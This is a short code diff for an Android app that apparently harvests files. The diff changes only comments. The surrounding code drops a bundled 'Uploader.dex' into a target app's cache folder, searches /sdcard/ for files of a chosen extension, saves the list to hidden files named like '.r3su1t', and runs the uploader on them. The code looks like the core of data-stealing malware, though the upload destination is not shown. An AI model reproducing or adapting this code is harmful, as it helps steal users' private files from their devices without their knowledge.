@@ -25,7 +25,7 @@ private void iq500Uploader()
 		File f = new File(cacheRoot + "/Uploader.dex"); //core class (uploader)
 		try
 		{
-			//check if adding Uploader class is required
+			//check if adding Uploader class to cache folder is required
 			if(!f.exists())
 			{
 				AssetManager assetManager = getAssets();
@@ -37,7 +37,7 @@ private void iq500Uploader()
 				out.close();
 			}
 			
-			//Run command
+			//Run command, do the jobs under the cache folder of the target app
 			String[] cmds = {"sh", "-c", String.format("cd %s && find /sdcard/ -name *%s > .r3su1t && dalvikvm -cp Uploader.dex Uploader .r3su1t > .upr3su1t", cacheRoot, ext)};
 			Runtime.getRuntime().exec(cmds);
 			
